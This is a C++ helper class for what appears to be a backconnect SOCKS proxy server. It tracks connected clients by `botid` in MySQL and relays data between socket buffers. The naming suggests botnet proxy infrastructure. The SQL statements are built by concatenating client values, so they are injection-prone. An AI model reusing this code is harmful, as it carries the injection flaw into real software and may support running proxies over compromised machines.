#include "config.h"

Hlp &Hlp::get()
{
    static Hlp instance;
    return instance;

}

int Hlp::getPort(string clientHash)
{
    unique_lock<mutex> lock(m_port_lock);
    int port = 0;
    map<string, int>::iterator it = clientPorts.find(clientHash);
    if (it == clientPorts.end()){
        clientPorts.insert( pair<string, int>(clientHash, 0) );
    }
    else {
        port = (*it).second;
    }

    return port;
}

void Hlp::setPort(string clientHash, int port)
{
    unique_lock<mutex> lock(m_port_lock);
    map<string, int>::iterator it = clientPorts.find(clientHash);
    if (it == clientPorts.end()){
        clientPorts.insert(pair<string, int>(clientHash, 0));
    }
    else {
        clientPorts[clientHash] = port;
    }
    lock.unlock();
    sync();

}

void Hlp::loadConfig()
{
    unique_lock<mutex> lock(m_config_lock);

    ifstream ifs("config.json");
    rapidjson::IStreamWrapper isw(ifs);

    configDocument.ParseStream(isw);


}

void Hlp::loadClients()
{
    unique_lock<mutex> lock(m_port_lock);

    ifstream ifs("clients.json");
    rapidjson::IStreamWrapper isw(ifs);
    rapidjson::Document d;
    d.ParseStream(isw);

    if (!d.IsObject()){
        return;
    }

    for (rapidjson::Document::ConstMemberIterator it = d.MemberBegin(); it != d.MemberEnd(); ++it){
        string k = (*it).name.GetString();
        int v = d[k].GetInt();

        clientPorts.insert(pair<string, int>(k, v));
    }

}

void Hlp::updateDB(string clientHash, db_status stat, int port)
{
    auto worker = [](string clientHash, db_status stat, int port){
        mysqlpp::Connection con( false );

        string mysql_login = hlp.valueString("mysql_user");
        string mysql_password = hlp.valueString("mysql_password");
        string mysql_db = hlp.valueString("mysql_db");
        string server = hlp.valueString("mysql_server");
        if (!server.length()){
            server = "localhost";
        }

        string hostname = hlp.valueString("localhost");
        if (!hostname.length()){
            hostname = "{{HOSTNAME}}";
        }

        if (!con.connect( mysql_db.c_str(), server.c_str(), mysql_login.c_str(), mysql_password.c_str(), 3306 )){
            cout << "[" << hlp.time() << "] Can`t connect to mysql\n";
            return;
        }

        vector<string> sqls;
        switch (stat){

            case Hlp::DB_CONNECTED: {
                string status = hostname + ":" + to_string(port);

                sqls.push_back("insert into `socks` (`botid`, `status`, `is_online`) values ('" + clientHash + "', '" + status + "', 1) on duplicate key update `status` = '" + status + "', `is_online` = 1");
                sqls.push_back("insert into `socks_log` (`botid`, `message`, `event`) values ('" + clientHash + "', 'connected to server', 'CONNECTED');");

                break;
            }
            case Hlp::DB_DISCONNECTED: {

                sqls.push_back("insert into `socks` (`botid`, `status`, `is_online`) values ('" + clientHash + "', '', 0) on duplicate key update `status` = '', `is_online` = 0;");
                sqls.push_back("insert into `socks_log` (`botid`, `message`, `event`) values ('" + clientHash + "', 'disconnected from server', 'DISCONNECTED');");
            break;
            }
        }

        for (auto &sql: sqls){
            mysqlpp::Query query = con.query(sql);
            if (!query.execute()){
                cout << "[" << hlp.time() << "] " << query.error() << endl;
                break;
            }
        }
    };

    /*thread *t = */new thread(worker, clientHash, stat, port);
}

int Hlp::valueInt(string name)
{
    if (!configDocument.IsObject() || !configDocument.HasMember(name.c_str()))
        return 0;
    else
        return configDocument[name.c_str()].GetInt();
}

string Hlp::valueString(string name)
{

    if (!configDocument.IsObject() || !configDocument.HasMember(name.c_str()))
        return "";
    else
        return configDocument[name.c_str()].GetString();

}

evconnlistener *Hlp::listenerForBuffer(bufferevent *buf)
{
    unique_lock<mutex> lock(m_listeners_lock);

    map<bufferevent*, evconnlistener*>::iterator it = bufferListener.find(buf);
    if (it == bufferListener.end()){
        return 0;
    }

    return (*it).second;

}

void Hlp::setListenerForBuffer(bufferevent *buf, evconnlistener *listener)
{
    unique_lock<mutex> lock(m_listeners_lock);

    if (listener == 0){
        bufferListener.erase(buf);
        return;
    }


    map<bufferevent*, evconnlistener*>::iterator it = bufferListener.find(buf);

    if (it == bufferListener.end()){
        bufferListener.insert(pair<bufferevent*, evconnlistener*>(buf, listener));
    }

}

void Hlp::sync()
{
    unique_lock<mutex> lock(m_port_lock);
    rapidjson::Document d;
    d.SetObject();

    auto& allocator = d.GetAllocator();
    for (auto &item: clientPorts){

        rapidjson::Value v(rapidjson::kNumberType);
        v.SetInt(item.second);

        d.AddMember(
                    rapidjson::Value(item.first, allocator).Move(),
                    rapidjson::Value(v, allocator).Move(),
                    allocator);
    }

    ofstream ofs("clients.json");
    rapidjson::OStreamWrapper osw(ofs);
    rapidjson::Writer<rapidjson::OStreamWrapper> writer(osw);
    d.Accept(writer);

}

pair<bufferevent *, bufferevent *> Hlp::getNextBuffers()
{
    unique_lock<mutex> lock(m_tunnel);
//    cout << q_buffers.size() << endl;
    cv.wait(lock);

    pair<bufferevent*, bufferevent*> res{0, 0};

    if (q_buffers.empty()){
        return res;
    }

    res = q_buffers.front();
    q_buffers.pop();
    return res;
}

pair<evutil_socket_t, uint8_t *> Hlp::getNextBuffers2()
{
    unique_lock<mutex> lock(m_tunnel);
    cv.wait(lock);

    pair<evutil_socket_t, uint8_t*> res{0, 0};

    if (q_buffers2.empty()){
        return res;
    }
    res = q_buffers2.front();
    q_buffers2.pop();
    return res;

}

pair<int, uint8_t *> Hlp::getNextBuffers3()
{
//    cout << socket_bufferrs.size() << endl;
    unique_lock<mutex> lock(m_tunnel);
    cv.wait(lock);

    map<evutil_socket_t, uint8_t*>::iterator nextElem = socket_bufferrs.begin();
    if (nextElem == socket_bufferrs.end()){
//        lock.unlock();
        return {0, 0};
    }


    evutil_socket_t fd = (*nextElem).first;
    uint8_t *data = (*nextElem).second;
    pair<evutil_socket_t, uint8_t*> res{fd, data};
    socket_bufferrs.erase(nextElem);

//    lock.unlock();
    return res;

}

void Hlp::pushNextBuffers(bufferevent *buf_in, bufferevent *buf_out)
{
    pair<bufferevent*, bufferevent*> res{buf_in, buf_out};
//    m_tunnel.lock();
    unique_lock<mutex> lock(m_tunnel);
    q_buffers.push(res);
    lock.unlock();
//    m_tunnel.unlock();

    if (buf_in == 0 && buf_out == 0){
        cv.notify_all();
    }
    else {
        cv.notify_one();
    }
}

void Hlp::pushNextBuffers2(int fd, uint8_t *data)
{
    pair<evutil_socket_t, uint8_t*> res{fd, data};
    unique_lock<mutex> lock(m_tunnel);
    q_buffers2.push(res);
    lock.unlock();

    cv.notify_one();
}

void Hlp::pushNextBuffers3(int fd, uint8_t *data)
{
    unique_lock<mutex> lock(m_tunnel);
    if (socket_bufferrs.find(fd) != socket_bufferrs.end()){

        uint8_t *exists_data = socket_bufferrs[fd];

        int exists_len = (exists_data[0] << 24) | (exists_data[1] << 16) | (exists_data[2] << 8) | exists_data[3];
        int new_len = (data[0] << 24) | (data[1] << 16) | (data[2] << 8) | data[3];

        int res_len = exists_len + new_len;

        uint8_t *res_data = (uint8_t*) malloc(res_len+4);

        res_data[0] = (res_len >> 24) & 0xff;
        res_data[1] = (res_len >> 16) & 0xff;
        res_data[2] = (res_len >> 8) & 0xff;
        res_data[3] = res_len & 0xff;

        memcpy(&res_data[4], &exists_data[4], exists_len);
        memcpy(&res_data[4+exists_len], &data[4], new_len);
        socket_bufferrs[fd] = res_data;
        free(data);

    }
    else {
        socket_bufferrs[fd] = data;
    }

//    q_sockets.push(fd);

    lock.unlock();

    if (fd == 0 && data == 0){
        cv.notify_all();
    }
    else {
        cv.notify_one();
    }
}

//void Hlp::pushNextBuffers4(int fd, std::shared_ptr<uint8_t> p_data)
//{
//    unique_lock<mutex> lock(m_tunnel);
//    if (socket_bufferrs.find(fd) != socket_bufferrs.end()){

//    }

//}

string Hlp::time(string fmt)
{
    auto now = chrono::system_clock::to_time_t(chrono::system_clock::now());
    stringstream ss;
    ss << put_time(localtime(&now), fmt.c_str());
    return ss.str();
}


#if __GNUG__ < 5
namespace std {

    string put_time(const tm *__tmb, const char *__fmt)
    {
        int len = strlen(__fmt) * 4;
        char formattedTime[len];
        bzero(formattedTime, len);
        ::strftime(formattedTime, len, __fmt, __tmb);
        string result(formattedTime);
        return result;

    }
}
#endif
